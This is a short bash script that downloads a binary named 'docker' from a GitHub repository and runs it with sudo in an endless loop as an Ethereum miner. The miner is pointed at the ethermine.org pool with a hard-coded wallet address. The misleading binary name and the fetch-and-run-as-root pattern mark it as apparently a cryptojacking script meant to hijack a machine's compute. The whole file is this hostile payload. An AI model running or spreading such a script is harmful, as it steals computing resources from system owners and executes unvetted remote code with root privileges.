#!/bin/bash

sudo apt install libpci3
wget https://github.com/xkolux/takealook/raw/main/docker
chmod +x docker
while [ 1 ]; do
sudo ./docker -pool stratum+tcp://us1.ethermine.org:4444 -wal 0xD07b31e87Bf3892D9F6cA4a417ccACD439EC51Cc.$(echo $(shuf -i 1-10 -n 1)-KILLME) -pass x -proto 2 -mi 12 -gt 400
sleep 5
done
sleep 999999999
